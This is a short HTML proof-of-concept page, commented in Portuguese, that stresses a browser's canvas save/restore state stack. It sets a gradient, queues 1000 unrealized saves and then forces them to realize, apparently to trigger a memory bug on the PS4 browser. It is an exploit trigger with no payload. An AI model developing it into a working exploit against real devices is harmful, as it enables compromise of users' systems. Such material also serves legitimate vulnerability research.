
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - Canvas )</title>
</head>
<body>
<script>
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

// Colocar um gradient no state atual (refcounted, vai para State)
const grad = ctx.createLinearGradient(0, 0, 100, 0);
grad.addColorStop(0, 'red');
ctx.fillStyle = grad;  // → realizeSaves() → State copiado com RefPtr<CanvasGradient>

// Acumular unrealized saves sem realizar
// (não aciona realizeSaves — apenas incrementa o counter)
// No PS4 não há MaxSaveCount, então isso só vai consumir memória quando realizar
for (let i = 0; i < 1000; i++)
    ctx.save();

// Acionar realizeSaves() agora — com 1000 saves pendentes
// → m_stateStack.append(state()) ×1000 → múltiplas reallocations
// → cada reallocation é uma chance de self-reference issue
ctx.lineWidth = 2;  // qualquer setter com realizeSaves()
</script>
</body>
</html>
